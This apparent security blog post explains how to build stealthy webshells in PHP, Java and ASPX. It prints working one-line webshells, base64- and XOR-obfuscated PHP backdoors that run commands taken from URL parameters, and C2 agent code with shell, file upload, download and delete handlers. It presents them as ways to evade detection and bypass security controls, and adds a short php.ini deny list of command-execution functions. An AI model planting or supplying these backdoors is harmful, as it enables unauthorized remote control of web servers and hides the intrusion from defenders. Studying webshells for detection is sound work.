---
layout: single
title:  "Stealthy Webshells: Leveraging Native Functions in PHP, ASPX and Java"
date:   2025-02-21 06:48:14 +0100
tags: [posts]
excerpt: "Exploring stealthy webshell techniques in PHP, ASPX, and Java to bypass security measures and maintain persistence"
published: true
---
Introduction
---
Webshells have long been a go-to tool for attackers and red teamers looking to maintain access to compromised web servers. While many traditional webshells rely on standard system commands (`exec`, `shell_exec`, etc.), these are increasingly detected by security tools and endpoint protection systems.

In this post, we’ll explore a stealthier approach: leveraging **native functions** in PHP, ASPX (C#), and Java to build custom webshells that blend in with legitimate application behavior. By using built-in language features, we can create **low-detection, high-functionality backdoors** that bypass basic security controls while maintaining control over the target environment.

## What is a Webshell?

A **webshell** is a malicious script that provides an attacker with remote access and control over a compromised web server. It acts as a **backdoor**, allowing execution of commands, file manipulation, privilege escalation, and even lateral movement within a network.

Webshells are commonly written in languages supported by web servers, such as **PHP, ASPX (C#), and Java**, making them highly versatile. Attackers often deploy them by exploiting **vulnerabilities** (e.g., file upload flaws, remote code execution) or by injecting malicious code into existing applications.

## Common Uses of Webshells

-   **Remote Command Execution** – Running system commands on the server.
-   **File Management** – Uploading, downloading, modifying, or deleting files.
-   **Privilege Escalation** – Attempting to gain higher system privileges.
-   **Persistence & Evasion** – Maintaining access while avoiding detection.
-   **Lateral Movement** – Using the compromised server to pivot into internal networks.

While webshells are often used by **attackers**, they are also studied by **penetration testers and red teamers** to assess security weaknesses and improve defenses.

In the next sections, we’ll explore how to build **custom webshells** using **native functions** in PHP, ASPX, and Java to evade detection and enhance functionality.

## Basic PHP Webshell

PHP is one of the most commonly targeted languages for webshells due to its widespread use in web applications and its built-in support for executing system commands. Basic PHP webshells are often simple scripts that allow attackers to run arbitrary commands on a compromised server. However, these basic implementations are also the most **detected** by security tools.

#### **Basic PHP Webshells**
A classic example of a simple PHP webshell is:

`<?php system($_GET['cmd']); ?>` 

This script takes a command from the URL (`cmd` parameter) and executes it using PHP’s `system()` function. For example, accessing:

`http://target.com/shell.php?cmd=whoami`

Would execute `whoami` on the server, revealing the user running the webserver process.

Another common variation uses `exec()`:

`<?php echo exec($_GET['cmd']); ?>` 

This works similarly but does not display the full command output like `system()`.

#### **Common PHP Functions Used in Webshells**
Most PHP webshells use one or more of the following functions to execute commands:

-   **`system`** – Executes a system command and outputs the result.
-   **`exec`** – Executes a system command but only returns the last line of output.
-   **`shell_exec`** – Runs a command and returns the full output as a string.
-   **`passthru`** – Executes a command and directly outputs the raw result, useful for binary responses.
-   **`popen`** – Opens a pipe to a process, allowing interaction with its input/output.
-   **`proc_open`** – More advanced method to start a process and interact with its I/O streams.

#### **Detection and Prevention**
Since these functions are commonly abused, many security tools flag their usage. Effective defenses include:

-   **Disabling dangerous functions** in `php.ini`:
    
    `disable_functions = system, exec, shell_exec, passthru, popen, proc_open` 

- **Using Web Application Firewalls (WAFs)** to detect suspicious requests.
- **Implementing file integrity monitoring** to detect unauthorized PHP files.
- **Restricting user permissions** to limit PHP’s ability to execute system commands.

## Leveraging Native PHP Functions for Stealthy Webshells

While traditional PHP webshells rely on direct system command execution (`system()`, `exec()`, etc.), these functions are frequently monitored and restricted in hardened environments. A more advanced approach involves **abusing native PHP functions** that provide similar capabilities while bypassing common security controls.

In this section, we’ll explore alternative methods using **native PHP functionalities** to maintain control over a compromised web server. Let's try to simulate the functionality of a shell using these functions:

### whoami

There are several alternatives to simulate the whoami command using native PHP functions as shown below:

<img src="{{ site.url }}{{ site.baseurl }}/images/whoami.png" alt="">
<img src="{{ site.url }}{{ site.baseurl }}/images/whoami2.png" alt="">
<img src="{{ site.url }}{{ site.baseurl }}/images/whoami3.png" alt="">

### pwd

The pwd command can be simulated as follows:

<img src="{{ site.url }}{{ site.baseurl }}/images/getcwd.png" alt="">

### cd

The cd command can be simulated as follows:

<img src="{{ site.url }}{{ site.baseurl }}/images/chdir.png" alt="">

### ls

The ls command can be simulated as follows:

<img src="{{ site.url }}{{ site.baseurl }}/images/scandir.png" alt="">
<img src="{{ site.url }}{{ site.baseurl }}/images/opendir.png" alt="">

### Putting it all together

This can be put together into a single PHP file and integrated into our C2:

```
function list_directory($path){
	$files = scandir($path);
	$output = "Listing contents of: " . realpath($path) . "\n";
	$output = $output . "\tUID\tGID\tSize\tMTime\tName\n";
	foreach ($files as $item) {
		$curFile = stat($path . "/" . $item);
		$curOutput = $curFile["uid"] . "\t" . $curFile["gid"] . "\t" . $curFile["size"] . "Bytes \t" . date("Y-m-d\TH:i:s\Z", $curFile["mtime"]) . "\t" . $item;
		$output = $output . "\n" . $curOutput;
	  }
	return $output;
}
function remove_file($path){
	if( unlink($path) ){
		return "Removed file";
	}
	return "Failed to remove file";
}
function checkin(){
	// format is IP|OS|User|Host|Domain|PID|Arch
	$host = gethostname();
	$ip = gethostbyname($host);
	$arch = php_uname('m');
	$user = get_current_user();
	$pid = getmypid();
	$os = php_uname();
	return $ip . "|" . $os . "|" . $user . "|" . $host . "|" . "" . "|" . $pid . "|" . $arch . "|";
}
function upload($path, $data){
	$fh = fopen($path, 'w');
	if( $fh === false ){
		return "Failed to write file";
	}
	fwrite($fh, $data);
	fclose($fh);
	return "Successfully wrote file";
}
function download($path){
	$content = file_get_contents($path);
	if( $content === false){
		return "Failed to get contents of file";
	}
	return base64_encode($content);
}
function process_message($full_message){
	if( !check_date() ){
		abort_call();
	}
	http_response_code(200);
	global $encryption_key;

	$decrypted_message = decrypt( $full_message, $encryption_key );
	//echo $decrypted_message;
	$pieces = explode("|", $decrypted_message);
	//echo count($pieces);
	if( count($pieces) < 2 ){
	    if(count($pieces) > 0){
	        return $pieces[0] . "|" . "wrong number of pieces";
	    }
		return "|wrong number of pieces";
	}
	$task_id = $pieces[0];
	$command = base64_decode($pieces[1]);
	$output = "";
	switch($command){
		case "shell":
			$output = shell_exec(base64_decode($pieces[2]) );
			break;
		case "pwd":
			$output = getcwd();
			break;
		case "checkin":
			$output = checkin();
			break;
		case "download":
			$output = download(base64_decode($pieces[2]));
			break;
		case "ls":
			$output = list_directory(base64_decode($pieces[2]));
			break;
		case "rm":
			$output = remove_file(base64_decode($pieces[2]));
			break;
		case "upload":
			$output = upload(base64_decode($pieces[2]), base64_decode($pieces[3]));
			break;
	}
	return $task_id . "|" . $output;}
```

Complete code: [Arachne Mythic Agent](https://github.com/MythicAgents/arachne/blob/main/Payload_Type/arachne/arachne/agent_code/arachne.php){:target="_blank"}

PHP webshells are powerful tools that attackers often use to gain unauthorized access and control over compromised servers. By leveraging native PHP functions, such as `system()`, `exec()`, `shell_exec()`, and more advanced functions like `proc_open()` and `popen()`, attackers can execute arbitrary commands and interact with the underlying system in ways that bypass common security defenses.

However, creating stealthier webshells requires exploiting less obvious PHP features like streams, file handling, and networking functions. These techniques make detection more challenging, as they don’t rely on the typical command execution functions that are commonly monitored and restricted.

In the next sections, we will explore more advanced webshell techniques in other programming languages like ASPX and Java, and how to evade detection with custom approaches.

## Java Webshells

Java, like PHP and ASPX, is widely used in web development, particularly for building robust, enterprise-level applications. However, Java-based web applications can also be vulnerable to webshells, which can allow attackers to execute arbitrary commands on the server. These webshells are often disguised as legitimate application code or are designed to exploit weaknesses in server configurations.

In this section, we’ll examine how Java can be abused for creating webshells, focusing on key techniques for command execution, as well as methods for evading detection.

## Using Java for Command Execution

Java provides two main classes **`Runtime`** and **`ProcessBuilder`** which are commonly used to execute system commands. These classes can be leveraged by attackers to run commands on the server, similar to PHP webshells.

#### **Using `Runtime.getRuntime().exec()`**

The `Runtime` class provides a method **`exec()`**, which allows Java applications to execute external commands. Here’s an example of how a simple Java webshell could be implemented using this method:

```
`import java.io.*;

public class WebShell {
    public static void main(String[] args) throws IOException {
        String cmd = args[0]; // Get the command passed via query parameter
        Process process = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line); // Output the command result
        }
    }
}` 
```
In this example, the Java program executes a system command passed through the `args[0]` argument, which could be supplied by an attacker through a URL like `http://target.com/webshell?cmd=whoami`. The output is printed on the server or can be sent back to the attacker.

As in the previous examples, we will see how we could simulate a shell (of course with its limitations).

### whoami

In Java, you can use `System.getProperty()` to retrieve system properties. This function allows you to query various aspects of the Java environment, including user information, system details, and more. While you cannot directly execute a command like `whoami` through `System.getProperty()`, you can obtain similar information related to the system user.

<img src="{{ site.url }}{{ site.baseurl }}/images/java.png" alt="">

### pwd

The pwd command can be simulated as follows:

<img src="{{ site.url }}{{ site.baseurl }}/images/pwdjava.png" alt="">
<img src="{{ site.url }}{{ site.baseurl }}/images/pwdjava01.png" alt="">

### ls

The ls command can be simulated as follows:

<img src="{{ site.url }}{{ site.baseurl }}/images/lsjava.png" alt="">

### cd

For reasons beyond our control, the code could not be reproduced as the sandbox has no other accessible directories. The code for the cd command is also attached:

```
import java.io.File;

public class WebShell {
    public static void main(String[] args) {
        String newDirectory = "/path/to/your/directory"; // The path you want to change to
        
        // Set the new working directory for the Java application
        System.setProperty("user.dir", newDirectory);
        
        // Verify if the directory change is successful
        String currentDir = System.getProperty("user.dir");
        System.out.println("Current working directory: " + currentDir);
    }
}
```

## ASPX Webshells

ASPX WebShells, written in ASP.NET, are particularly dangerous in Windows-based environments, as they can leverage the powerful capabilities of the .NET framework and IIS (Internet Information Services).

In this section we will analyze the Mythic ASPX agent:

```
 case "shell":
                        response = tasking[0] + "|" + Shell(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "download":
                        response = tasking[0] + "|" + Download(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "checkin":
                        response = tasking[0] + "|" + CheckIn();
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "pwd":
                        response = tasking[0] + "|" + CurrentDirectory();
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "cd":
                        response = tasking[0] + "|" + ChangeDirectory(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "rm":
                        response = tasking[0] + "|" + RemoveFile(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "ls":
                        response = tasking[0] + "|" + ListDirectory(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
```

Code: [Arachne ASPX Shell](https://github.com/MythicAgents/arachne/blob/main/Payload_Type/arachne/arachne/agent_code/arachne.aspx){:target="_blank"}

In the code you can see calls to the following functions:

-   **`Shell`** → Executes system commands and returns the output.
-   **`Download`** → Reads and returns the content of a specified file.
-   **`CheckIn`** → Sends a response confirming the WebShell is active.
-   **`CurrentDirectory`** → Retrieves the current working directory.
-   **`ChangeDirectory`** → Changes the working directory.
-   **`RemoveFile`** → Deletes a specified file.
-   **`ListDirectory`** → Lists the contents of a directory.

Of course, it should be noted that the shell command is not stealthy.

## Obfuscate Webshells

To evade detection by security tools and analysts, attackers often employ obfuscation techniques. Obfuscation disguises the code, making it harder to detect and analyze while maintaining its malicious functionality. Some simple examples are:

* String Encoding and Concatenation

```
<?php
$cmd = "sy"."stem";
$cmd($_GET['cmd']);
?>
```

This script behaves like a typical `system($_GET['cmd']);` web shell but is harder to detect using simple pattern matching.

* Base64 Encoding

```
<?php
eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"));
?>
```

The encoded string `c3lzdGVtKCRfR0VUWyJjbWQiXSk7` decodes to `system($_GET['cmd']);`, effectively hiding the original payload.

These are simple options with which to obfuscate our code, but let's look at other more advanced webshells:

```
<?=`$_GET[0]`?>
```

This is an extremely short and concise version of a web shell in PHP. Let's break it down and analyze how it works:

```
<?= ... ?>
```

It is a short PHP tag that is equivalent to <?php echo ... ?>, this means that the content inside <?= ... ?> is executed and printed directly to the output.

`` (Backticks)

In PHP, **backticks ()** work similarly to shell_exec() or system().
They execute the operating system command provided inside them and return the result.

```
$_GET[0]
```

$_GET is a superglobal array in PHP that collects the parameters sent via an HTTP GET request. $_GET[0] means that the script expects a parameter with index 0 in the URL and will execute it as a system command.
Same but using POST:

```
<?=`$_POST[0]`?>
```

### Advanced Ofuscated Webshells

```
<?php $_=${'_'.('\{\{\{' ^ '<>/')};$_[0]($_[1]); ?>
```

This part generates a global variable:

```
$_=${'_'.('\{\{\{' ^ '<>/')};
```

- `\{\{\{ ^ <>/` performs a bitwise operation between strings.
- XOR compares each bit of both strings and returns a new character.

Let's see what value this XOR operation generates:

<img src="{{ site.url }}{{ site.baseurl }}/images/webshellofusc.png" alt="">

Therefore, the variable $_ is defined as:

```
$_ = $_GET;
```

This means that `$_` is now an alias for `$_GET`, which contains the parameters sent in the URL.
The second part execute the code:

```
 $_[0]($_[1]);
```

- ``$_[0]`` takes the first parameter passed in the URL ``($_GET[0])``.
- ``$_[1] ``takes the second parameter ``($_GET[1])``.
- ``$_[0]($_[1]);`` executes the function stored in ``$_[0]``, passing ``$_[1]`` as an argument.

Example:

```
http://example.com/shell.php?0=system&1=whoami
```

## Conclusion

In conclusion, webshells are a powerful yet dangerous tool when leveraged by attackers to gain unauthorized control over a web server. While PHP, ASPX, and Java provide various means for attackers to exploit native functions, it is essential to understand both the methods and the consequences of such compromises. By examining common webshell tactics, like using native functions to execute system commands, we can better recognize and defend against these types of attacks.

## References
- [PHP Documentation](https://www.php.net/docs.php){:target="_blank"}
- [MythicAgents Github Repository](https://github.com/MythicAgents){:target="_blank"}
- [Codapi](https://codapi.org/java/){:target="_blank"}
- [Tiny-PHP-Webshell](https://github.com/bayufedra/Tiny-PHP-Webshell){:target="_blank"}